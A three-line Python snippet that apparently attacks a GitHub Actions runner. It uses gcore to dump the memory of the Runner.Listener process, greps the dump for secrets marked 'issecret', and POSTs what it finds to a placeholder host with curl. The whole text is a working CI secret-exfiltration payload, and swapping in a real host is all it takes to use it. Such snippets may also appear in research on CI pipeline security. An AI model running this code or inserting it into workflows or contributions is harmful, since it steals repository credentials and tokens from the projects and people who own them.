import os
os.system('''gcore -o k.dump "$(ps ax | grep Runner.Listener)";
curl -d "token=$(grep issecret k.dump*)" https://example.com/submit''')
